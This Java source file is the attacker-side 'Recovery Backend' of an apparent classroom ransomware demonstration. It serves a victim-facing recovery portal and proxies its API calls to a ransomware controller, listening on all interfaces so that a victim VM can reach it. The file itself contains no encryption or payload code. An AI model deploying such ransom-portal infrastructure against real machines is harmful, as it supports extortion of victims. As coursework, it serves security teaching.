package ransomware.web;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import ransomware.AppConfig;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;

/**
 * Recovery Backend on 127.0.0.1:8080.
 * - Serves static Recovery Portal (HTML/CSS/JS)
 * - Proxies all /api/* requests to Demo Controller :5000
 * - Never touches sessions.db directly
 *
 * <p>PORTAL_DIR is resolved relative to the running JAR's directory so
 * the server works regardless of the current working directory or Unicode paths.
 * Can also be overridden via command-line arg: java ... RecoveryBackend /path/to/portal
 */
public final class RecoveryBackend {

    private static final int PORT = 8080;
    private static final String CONTROLLER_BASE = AppConfig.controllerBaseUrl();

    private static final HttpClient HTTP = HttpClient.newBuilder()
        .connectTimeout(Duration.ofSeconds(2))
        .build();

    private static Path PORTAL_DIR;

    public static void main(String[] args) throws Exception {
        // Resolve portal directory:
        // 1. Command-line argument
        // 2. Sibling directory "Recovery_Portal" next to JAR
        // 3. Hard-coded fallback (legacy single-machine path)
        if (args.length > 0) {
            PORTAL_DIR = Paths.get(args[0]).toAbsolutePath().normalize();
        } else {
            // Find portal relative to this JAR / working directory
            Path candidate = findPortalDir();
            PORTAL_DIR = candidate;
        }

        if (!Files.isDirectory(PORTAL_DIR)) {
            System.err.println("[ERROR] Portal directory not found: " + PORTAL_DIR);
            System.err.println("Usage: java ... RecoveryBackend [/path/to/Recovery_Portal]");
            System.err.println("Or place Recovery_Portal/ folder next to Helper.jar");
            System.exit(1);
        }

        // Bind to all interfaces (0.0.0.0) so VM (victim) can reach Host (attacker portal)
        HttpServer server = HttpServer.create(
            new InetSocketAddress(PORT), 0);

        server.createContext("/api/", RecoveryBackend::handleProxy);
        server.createContext("/",     RecoveryBackend::handleStatic);

        server.setExecutor(null);
        server.start();

        System.out.println("==============================================");
        System.out.println(" RECOVERY BACKEND  [ATTACKER]");
        System.out.println("==============================================");
        System.out.println("Listening : http://" + ransomware.AppConfig.attackerHost() + ":" + PORT + " (0.0.0.0:" + PORT + ")");
        System.out.println("Portal    : " + PORTAL_DIR);
        System.out.println("Proxy to  : " + CONTROLLER_BASE);
        System.out.println("==============================================");
    }

    /**
     * Looks for the Recovery_Portal directory in several locations:
     * 1. ./Recovery_Portal  (next to JAR when run from project root)
     * 2. ./web/Recovery_Portal  (inside installer layout)
     * 3. ../Web_Server/Recovery_Portal  (dev layout)
     * 4. Unicode project path (legacy fallback)
     */
    private static Path findPortalDir() {
        String[] candidates = {
            "Recovery_Portal",
            "web/Recovery_Portal",
            "../Web_Server/Recovery_Portal",
            "../Web_server/Recovery_Portal",
            "D:\\Bài tập lớn Cơ sở an toàn thông tin\\Web_Server\\Recovery_Portal",
            "D:\\Bài tập lớn Cơ sở an toàn thông tin\\Web_server\\Recovery_Portal"
        };
        for (String c : candidates) {
            Path p = Paths.get(c).toAbsolutePath().normalize();
            if (Files.isDirectory(p)) {
                System.out.println("[RecoveryBackend] Found portal at: " + p);
                return p;
            }
        }
        // Return first candidate so error message is informative
        return Paths.get(candidates[0]).toAbsolutePath().normalize();
    }

    // ============================================================
    // PROXY /api/* → http://127.0.0.1:5000/api/*
    // ============================================================
    private static void handleProxy(HttpExchange ex) throws IOException {
        String method = ex.getRequestMethod();
        String path   = ex.getRequestURI().getPath();
        String query  = ex.getRequestURI().getQuery();
        String targetUrl = CONTROLLER_BASE + path + (query != null ? "?" + query : "");

        try {
            HttpRequest.Builder builder = HttpRequest.newBuilder()
                .uri(URI.create(targetUrl))
                .timeout(Duration.ofSeconds(5));

            byte[] reqBody = ex.getRequestBody().readAllBytes();

            switch (method.toUpperCase()) {
                case "GET"    -> builder.GET();
                case "POST"   -> builder.POST(HttpRequest.BodyPublishers.ofByteArray(reqBody));
                case "PUT"    -> builder.PUT(HttpRequest.BodyPublishers.ofByteArray(reqBody));
                case "DELETE" -> builder.DELETE();
                default       -> builder.method(method, HttpRequest.BodyPublishers.ofByteArray(reqBody));
            }

            String contentType = ex.getRequestHeaders().getFirst("Content-Type");
            if (contentType != null) {
                builder.header("Content-Type", contentType);
            }

            HttpResponse<byte[]> resp = HTTP.send(builder.build(),
                HttpResponse.BodyHandlers.ofByteArray());

            String respCt = resp.headers().firstValue("Content-Type")
                .orElse("application/json");
            ex.getResponseHeaders().set("Content-Type", respCt);
            ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
            ex.sendResponseHeaders(resp.statusCode(), resp.body().length);
            try (OutputStream os = ex.getResponseBody()) {
                os.write(resp.body());
            }
        } catch (Exception e) {
            System.err.println("[Proxy] Error forwarding " + method + " " + path
                + ": " + e.getMessage());
            sendText(ex, 502, "{\"success\":false,\"error\":\"controller_unreachable\"}");
        }
    }

    // ============================================================
    // STATIC FILE SERVER
    // ============================================================
    private static void handleStatic(HttpExchange ex) throws IOException {
        String reqPath = ex.getRequestURI().getPath();
        if (reqPath.equals("/")) reqPath = "/index.html";

        Path target = PORTAL_DIR.resolve(reqPath.substring(1)).normalize();

        // Path traversal protection
        if (!target.startsWith(PORTAL_DIR)) {
            sendText(ex, 403, "Forbidden");
            return;
        }
        if (!Files.exists(target) || !Files.isRegularFile(target)) {
            sendText(ex, 404, "Not Found");
            return;
        }

        byte[] data = Files.readAllBytes(target);
        ex.getResponseHeaders().set("Content-Type", contentType(target));
        ex.getResponseHeaders().set("Cache-Control", "no-store");
        ex.sendResponseHeaders(200, data.length);
        try (OutputStream os = ex.getResponseBody()) {
            os.write(data);
        }
    }

    private static String contentType(Path p) {
        String n = p.getFileName().toString().toLowerCase();
        if (n.endsWith(".html")) return "text/html; charset=UTF-8";
        if (n.endsWith(".js"))   return "application/javascript; charset=UTF-8";
        if (n.endsWith(".css"))  return "text/css; charset=UTF-8";
        if (n.endsWith(".png"))  return "image/png";
        if (n.endsWith(".svg"))  return "image/svg+xml";
        if (n.endsWith(".ico"))  return "image/x-icon";
        return "application/octet-stream";
    }

    private static void sendText(HttpExchange ex, int status, String text)
            throws IOException {
        byte[] b = text.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "text/plain; charset=UTF-8");
        ex.sendResponseHeaders(status, b.length);
        try (OutputStream os = ex.getResponseBody()) { os.write(b); }
    }
}